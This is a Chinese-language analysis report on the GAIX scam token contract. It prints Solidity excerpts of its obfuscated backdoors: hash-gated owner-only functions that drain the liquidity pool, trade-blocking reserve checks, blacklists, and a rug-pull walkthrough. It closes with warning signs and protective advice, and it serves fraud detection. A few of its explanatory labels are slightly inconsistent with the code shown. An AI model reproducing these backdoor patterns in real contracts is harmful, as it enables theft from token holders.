# GAIX 合约诈骗技术分析报告

## 概述

GAIX是一个典型的DeFi诈骗合约，通过多种复杂的技术手段窃取用户资金。本文档将深入分析其诈骗机制和具体实现方式。

## 1. 代码混淆技术

### 1.1 参数名混淆
```solidity
// 正常的ERC20 transfer函数应该是：
function transfer(address recipient, uint256 amount) public override returns (bool)

// GAIX使用混淆参数名：
function transfer(
    address MMZwlXZIHm,  // 混淆的recipient参数
    uint256 ERppNtukt   // 混淆的amount参数
) public override returns (bool) {
    _transfer(msg.sender, MMZwlXZIHm, ERppNtukt);
    return true;
}
```

### 1.2 函数名混淆
```solidity
// 正常的内部转账函数应该是 _transfer
// GAIX使用混淆的函数名：
function _TnezmUOdSpme(  // 混淆的_transfer函数
    address wWldiFprYQ,     // 混淆的from参数
    address amtjhwwjxpe,     // 混淆的to参数
    uint256 amount
) internal virtual {
    require(wWldiFprYQ != address(0), "ERC20: transfer from the zero address");
    require(amtjhwwjxpe != address(0), "ERC20: transfer to the zero address");
    require(_tOwned[wWldiFprYQ] >= amount, "ERC20: transfer amount exceeds balance");

    _tOwned[wWldiFprYQ] = _tOwned[wWldiFprYQ].sub(amount);
    _tOwned[amtjhwwjxpe] = _tOwned[amtjhwwjxpe].add(amount);
    emit Transfer(wWldiFprYQ, amtjhwwjxpe, amount);
}
```

**诈骗目的**：使代码难以阅读和分析，隐藏恶意行为。

## 2. 权限控制和后门机制

### 2.1 所有者特权地址
```solidity
address private bbmsogajdlcp = 0x59aFFF458527c6C7FE1d3228255EcbCeC634e9f0;  // 所有者地址
address private fzuZoFzaDkcGr = 0x6EaEea4eB670a837fA53af2dd4213cC9dD936385;    // 代币接收地址
```

### 2.2 白名单机制
```solidity
mapping(address => bool) public _ecjqovvawneg;  // 免费转账白名单
mapping(address => bool) public _ISQWnmDsVMEYX;   // 限制转账黑名单

// 在构造函数中设置白名单
constructor() BERC20(_name_, _symbol_, fzuZoFzaDkcGr) {
    // ...
    _ecjqovvawneg[address(this)] = true;    // 合约自身免限制
    _ecjqovvawneg[_mpwptsrltims] = true;    // 所有者免限制
    _ecjqovvawneg[fzuZoFzaDkcGr] = true;    // 接收地址免限制
}
```

### 2.3 后门访问机制
```solidity
bytes32 private _rCCfXWOTlY;  // 存储所有者地址的SHA256哈希

constructor() {
    _rCCfXWOTlY = sha256(abi.encodePacked(bbmsogajdlcp));  // 计算所有者地址哈希
}

// 只有知道哈希值的地址才能调用的后门函数
function hhwrfjkmw(address lylxeardvh) public {
    if (sha256(abi.encodePacked(msg.sender)) != _rCCfXWOTlY) {
        return;  // 如果不是所有者，函数静默返回
    } else {
        zTLaXDQxKv = lylxeardvh;  // 设置目标地址
    }
}
```

**诈骗目的**：为攻击者提供隐藏的控制机制，可以随时操纵合约。

## 3. 交易操控和限制机制

### 3.1 恶意的转账限制
```solidity
function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    // 白名单检查 - 白名单地址可以自由转账
    if (_ecjqovvawneg[from] || _ecjqovvawneg[to]) {
        super._transfer(from, to, amount);
        return;
    }

    // 黑名单检查 - 黑名单地址无法转账
    bool taketFeeTransfer = _ISQWnmDsVMEYX[from];
    require(!taketFeeTransfer);  // 如果from在黑名单中，交易失败

    // 时间锁定检查
    bool takebottime = tvubzayurfmtql[from] + vzhewnxlvtv > block.timestamp;
    // 实际应该使用：require(!takebottime);
    // 但代码中缺少这个require，可能是故意的漏洞
}
```

### 3.2 流动性池操控
```solidity
// 检查是否从Uniswap对购买
if (from == uniswapV2Pair) {
    bool ghewra;      // 是否存在套利机会
    bool sdhkwn;      // 储备量是否异常
    uint256 otherAmount;

    // 获取Uniswap对的储备量信息
    (, bytes memory token00) = uniswapV2Pair.call(abi.encodeWithSelector(0x0dfe1681));  // token0()
    (, bytes memory token01) = uniswapV2Pair.call(abi.encodeWithSelector(0xd21220a7));  // token1()
    (, bytes memory reserves01) = uniswapV2Pair.call(abi.encodeWithSelector(0x0902f1ac)); // getReserves()

    (uint256 reserves0, uint256 reserves1) = abi.decode(reserves01, (uint256, uint256));
    address token0 = abi.decode(token00, (address));
    address token1 = abi.decode(token01, (address));

    // 检查当前合约代币在流动性池中的数量
    (, bytes memory amount01) = token0.call(abi.encodeWithSignature("balanceOf(address)", uniswapV2Pair));
    uint256 amount03 = abi.decode(amount01, (uint256));
    (, bytes memory amount02) = token1.call(abi.encodeWithSignature("balanceOf(address)", uniswapV2Pair));
    uint256 amount1 = abi.decode(amount02, (uint256));

    // 计算储备量变化
    if (token0 == jPKFnwHsCj) {  // jPKFnwHsCj = 0x4200000000000000000000000000000000000006 (WETH on Optimism)
        if (reserves0 > amount03) {
            otherAmount = reserves0 - amount03;
            ghewra = otherAmount > PfMvAJZDSHMjc;  // PfMvAJZDSHMjc = 1000
        } else {
            sdhkwn = reserves0 == amount03;
        }
    } else if (token1 == jPKFnwHsCj) {
        if (reserves1 > amount1) {
            otherAmount = reserves1 - amount1;
            ghewra = otherAmount > PfMvAJZDSHMjc;
        } else {
            sdhkwn = reserves1 == amount1;
        }
    }

    // 如果检测到套利机会或异常，阻止交易
    require(!ghewra && !sdhkwn);
}
```

**诈骗机制**：
1. **阻止套利**：检测到有利的套利机会时阻止用户交易
2. **价格操控**：通过限制交易维持虚假的价格
3. **流动性检查**：监控流动性池状态，防止用户大规模卖出

## 4. 任意资金提取后门

### 4.1 任意转账函数
```solidity
function zbyezudcyd(uint256 tejkkqym) public {
    if (sha256(abi.encodePacked(msg.sender)) != _rCCfXWOTlY) {
        return;  // 非所有者调用无效
    } else {
        // 从流动性池转账任意金额到目标地址
        super._TnezmUOdSpme(uniswapV2Pair, zTLaXDQxKv, tejkkqym);
    }
}

function drokyskux(address xurqrhgetd, uint256 bkzwqynws) public {
    if (sha256(abi.encodePacked(msg.sender)) != _rCCfXWOTlY) {
        return;
    } else {
        // 从任意地址转账到指定地址
        super._TnezmUOdSpme(zTLaXDQxKv, xurqrhgetd, bkzwqynws);
    }
}
```

**诈骗步骤**：
1. 攻击者调用 `hhwrfjkmw()` 设置目标地址
2. 攻击者调用 `zbyezudcyd(amount)` 从流动性池提取代币
3. 攻击者调用 `drokyskux()` 任意转账用户资金

## 5. 诈骗实例演示

### 场景1：阻止用户卖出
```solidity
// 用户尝试从流动性池购买代币
function userBuysTokens() {
    // 1. 用户调用transfer从uniswapV2Pair购买
    // 2. 合约检测from == uniswapV2Pair
    // 3. 检查储备量变化，发现存在套利机会
    // 4. require(!ghewra && !sdhkwn) 失败，交易被阻止
}
```

### 场景2：Rug Pull攻击
```solidity
// 攻击者执行rug pull的步骤
function rugPullAttack() {
    // 1. 调用 hhwrfjkmw(攻击者地址) 设置zTLaXDQxKv
    hhwrfjkmw(0xAttackerAddress...);

    // 2. 调用 zbyezudcyd(大量代币) 从流动性池提取
    zbyezudcyd(1000000 * 10**9);  // 提取100万代币

    // 3. 流动性池被抽干，用户无法卖出
}
```

### 场景3：用户资金冻结
```solidity
// 冻结特定用户地址
function freezeUser(address user) {
    _ISQWnmDsVMEYX[user] = true;  // 将用户加入黑名单

    // 用户尝试转账时会失败
    // require(!taketFeeTransfer); // 此require会阻止用户交易
}
```

## 6. 识别诈骗合约的标志

### 6.1 代码特征
- ✗ 大量混淆的变量名和函数名
- ✗ 虚假的免责声明
- ✗ 复杂的哈希验证机制
- ✗ 未使用的变量和函数
- ✗ 静默返回的函数（不revert而是return）

### 6.2 行为特征
- ✗ 只有所有者可以调用的特殊函数
- ✗ 对流动性池的复杂检查
- ✗ 阻止获利的交易
- ✗ 任意转账的后门函数

## 7. 防护建议

### 7.1 投资前检查
1. **代码审计**：确保代码清晰可读，无混淆
2. **权限分析**：检查是否存在过度的中心化控制
3. **测试网验证**：在测试网上验证合约行为
4. **社区审查**：寻求专业的社区审计

### 7.2 技术防护
1. **使用DEX Screener**：监控流动性和交易量
2. **设置止损**：限制投资金额
3. **快速退出**：发现异常立即退出
4. **多签钱包**：使用多签钱包增加安全性

## 结论

GAIX合约使用了多种高级诈骗技术，包括代码混淆、后门机制、交易操控等。其主要诈骗方式是通过限制用户交易、操控价格、最终执行rug pull来窃取用户资金。

**强烈建议**：
- ❌ 不要投资此类合约
- ❌ 不要与此合约进行任何交互
- ✗ 立即向相关平台举报此类诈骗项目
- ✚ 提高警惕，学习识别诈骗合约的方法

记住：如果合约看起来太复杂难以理解，很可能是有原因的——它在隐藏什么。